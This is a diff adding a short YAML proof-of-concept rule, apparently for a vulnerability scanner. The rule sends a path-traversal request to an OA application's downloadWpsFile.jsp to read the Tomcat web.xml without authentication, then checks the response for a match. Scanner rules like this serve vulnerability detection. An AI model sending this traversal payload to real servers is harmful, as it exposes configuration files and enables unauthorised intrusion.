@@ -1,0 +1,13 @@
+name: poc-yaml-test-unauth
+manual: true
+transport: http
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml
+    expression: response.status == 200 && response.body_string.contains("web-app") && response.body_string.contains("xml")
+expression: r0()
+detail:
+  author: k3ppf0r
